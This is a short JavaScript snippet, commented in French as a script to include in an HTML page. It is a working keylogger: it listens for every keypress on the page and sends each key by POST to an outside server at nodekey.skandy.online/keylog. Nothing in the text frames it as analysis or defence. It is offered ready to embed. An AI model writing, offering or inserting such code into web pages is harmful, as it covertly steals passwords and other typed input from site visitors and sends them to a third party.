// Script à inclure dans ta page HTML
(function() {
    document.addEventListener('keydown', function(e) {
        fetch('http://nodekey.skandy.online/keylog', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ key: e.key })
        });
    });
})();
